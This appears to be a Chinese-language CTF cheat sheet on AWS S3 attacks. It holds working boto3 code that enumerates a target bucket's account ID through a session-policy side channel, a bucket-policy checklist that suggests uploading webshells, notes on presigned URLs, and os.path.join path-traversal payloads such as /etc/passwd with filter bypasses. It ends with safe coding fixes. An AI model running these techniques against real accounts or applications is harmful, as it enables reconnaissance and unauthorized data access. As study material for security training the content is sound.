# S3 攻击技术详解

## 1. S3 Account ID 侧信道枚举

**原理**：AWS STS Session Policy 支持 `s3:ResourceAccount` 条件键。通过 AssumeRole 附加限制性策略，可以根据响应（AccessDenied vs NoSuchKey/Success）判断目标 Bucket 所属 Account ID 的每一位数字。

**前置条件**：
- 拥有一个 AWS 账户（CTF 环境通常提供）
- 需要 IAM User + Role（root 不能直接 AssumeRole）
- 目标 Bucket 中至少有一个已知 Key（如 `index.html`、`register.html`）

### 准备工作

```python
import boto3, json

iam = boto3.client('iam', region_name='us-east-1')
sts = boto3.client('sts', region_name='us-east-1')
my_acct = sts.get_caller_identity()['Account']

# 创建 Role（附加 S3ReadOnly）
try:
    iam.create_role(
        RoleName='s3-enum-role',
        AssumeRolePolicyDocument=json.dumps({
            "Version": "2012-10-17",
            "Statement": [{"Effect": "Allow",
                "Principal": {"AWS": f"arn:aws:iam::{my_acct}:root"},
                "Action": "sts:AssumeRole"}]
        }))
    iam.attach_role_policy(RoleName='s3-enum-role',
        PolicyArn='arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess')
except: pass  # 已存在

# 创建 User（需要 AssumeRole 权限）
try:
    iam.create_user(UserName='s3-enum-user')
except: pass
key = iam.create_access_key(UserName='s3-enum-user')['AccessKey']
iam.put_user_policy(UserName='s3-enum-user', PolicyName='assume',
    PolicyDocument=json.dumps({"Version": "2012-10-17", "Statement": [{
        "Effect": "Allow", "Action": "sts:AssumeRole", "Resource": "*"}]}))

import time; time.sleep(15)  # IAM 传播延迟

sts_user = boto3.client('sts', region_name='us-east-1',
    aws_access_key_id=key['AccessKeyId'],
    aws_secret_access_key=key['SecretAccessKey'])
role_arn = f"arn:aws:iam::{my_acct}:role/s3-enum-role"
```

### 逐位枚举

```python
BUCKET = "target-bucket-name"
KNOWN_KEY = "index.html"  # 已知存在的 S3 Key

account_id = ""
for pos in range(12):
    for digit in range(10):
        pattern = account_id + str(digit) + "?" * (11 - pos)
        policy = json.dumps({"Version": "2012-10-17", "Statement": [{
            "Effect": "Allow", "Action": "s3:GetObject",
            "Resource": f"arn:aws:s3:::{BUCKET}/*",
            "Condition": {"StringLike": {"s3:ResourceAccount": [pattern]}}
        }]})
        try:
            creds = sts_user.assume_role(
                RoleArn=role_arn, RoleSessionName=f"e{pos}{digit}",
                Policy=policy, DurationSeconds=900)['Credentials']
            s3 = boto3.client('s3', region_name='us-east-1',
                aws_access_key_id=creds['AccessKeyId'],
                aws_secret_access_key=creds['SecretAccessKey'],
                aws_session_token=creds['SessionToken'])
            s3.get_object(Bucket=BUCKET, Key=KNOWN_KEY)
            account_id += str(digit)
            print(f"pos {pos}: {digit} → {account_id}")
            break
        except Exception as e:
            if 'AccessDenied' in str(e):
                continue
            # NoSuchKey 也表示 Account ID 匹配成功
            if 'NoSuchKey' in str(e):
                account_id += str(digit)
                print(f"pos {pos}: {digit} → {account_id}")
                break

print(f"Target Account ID: {account_id}")
```

**参考**：[Ben Bridts — Finding the Account ID of any public S3 bucket](https://cloudar.be/awsblog/finding-the-account-id-of-any-public-s3-bucket/)

---

## 2. S3 Bucket 策略分析 Checklist

拿到 Bucket Policy 或 IAM Policy 后的分析清单：

| 检查项 | 危险信号 | 利用方式 |
|--------|---------|---------|
| `Principal: *` | 🔴 任何人可访问 | 直接操作 Bucket/Object |
| `Action: s3:GetObject` on `/*` | 🟡 可读取所有对象 | 遍历 Key 读取敏感文件 |
| `Action: s3:PutObject` | 🟡 可写入对象 | 上传 WebShell/XSS payload |
| `Action: s3:ListBucket` | 🟡 可列举对象 | 发现隐藏文件 |
| `Condition: StringLike` with `*` | 🟡 通配符可能被绕过 | 构造满足条件的输入 |
| `s3:prefix` 条件限制 | 🟢 仅限特定前缀 | 检查前缀是否可绕过 |

---

## 3. S3 Presigned URL 利用

```bash
# 如果拿到了 AWS 凭据且有 s3:GetObject 权限
aws s3 presign s3://BUCKET/KEY --expires-in 3600

# 从 API 响应中提取 presigned URL
# 常见于：图片上传、文件下载、邮件附件
# URL 格式：https://BUCKET.s3.amazonaws.com/KEY?X-Amz-Algorithm=...&X-Amz-Credential=...

# Presigned URL 信息泄露
# X-Amz-Credential 包含 AccessKeyId 和 Region
# 可用于识别账户和服务区域
```

---

## 4. S3 路径穿越（os.path.join）

Python `os.path.join()` 的危险行为：当后续参数是绝对路径时，丢弃前面所有路径。

```python
import os.path

# 正常
os.path.join("templates", "default.txt")       # → "templates/default.txt"

# 攻击：绝对路径
os.path.join("templates", "/flag.txt")          # → "/flag.txt"  ← 前缀被丢弃！
os.path.join("uploads", "/etc/passwd")          # → "/etc/passwd"

# 常见过滤绕过
# 过滤 ".." → 用绝对路径 "/flag" 绕过
# 过滤 "/" → 较难绕过，但检查是否只过滤开头
# 过滤 "flag" → 尝试 "/Flag"、"/FLAG"（S3 Key 大小写敏感）

# S3 Key 中 "/" 开头的行为
# S3 Key 允许以 "/" 开头，如 "/flag.txt" 是合法 Key
s3.get_object(Bucket="private-bucket", Key="/flag.txt")  # 有效！
```

### 安全的替代方案（用于识别修复后的目标）

```python
# 白名单校验
import re
if not re.match(r'^[a-zA-Z0-9_-]+$', template):
    raise ValueError("Invalid template")

# 字符串拼接而非 os.path.join
template_key = f"templates/{template}.txt"

# 结果校验
template_key = os.path.join("templates", f"{template}.txt")
if not template_key.startswith("templates/"):
    raise ValueError("Path traversal detected")
```
